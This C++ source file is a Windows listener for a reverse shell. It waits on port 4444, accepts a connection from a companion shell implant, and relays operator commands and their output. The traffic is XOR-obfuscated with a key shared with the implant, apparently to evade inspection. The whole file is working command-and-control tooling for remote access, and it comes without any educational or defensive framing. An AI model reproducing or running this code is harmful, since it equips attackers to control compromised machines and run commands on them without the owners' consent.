// Listener for Windows

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#pragma comment(lib, "ws2_32.lib")

const char XOR_KEY = 0x5A; // same as shell

std::string xor_decrypt(const std::string& data) 
{
    std::string result = data;
    for (char& c : result) c ^= XOR_KEY;
    return result;
}

std::string xor_encrypt(const std::string& data) 
{
    return xor_decrypt(data); // same logic
}

int main() 
{
    WSADATA wsa;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server, client;
    char buffer[4096];

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    server_socket = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(4444);

    bind(server_socket, (struct sockaddr*)&server, sizeof(server));
    listen(server_socket, 1);
    std::cout << "[+] Listening on port 4444...\n";

    int client_len = sizeof(client);
    client_socket = accept(server_socket, (struct sockaddr*)&client, &client_len);
    std::cout << "[+] Connection established.\n";

    while (true) 
    {
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) break;

        std::string encrypted_data(buffer, bytes_received);
        std::string decrypted = xor_decrypt(encrypted_data);
        std::cout << decrypted;

        std::cout << "\n> ";
        std::string cmd;
        std::getline(std::cin, cmd);
        cmd += "\n";

        std::string encrypted_cmd = xor_encrypt(cmd);
        send(client_socket, encrypted_cmd.c_str(), encrypted_cmd.size(), 0);
    }

    closesocket(client_socket);
    closesocket(server_socket);
    WSACleanup();
    return 0;
}
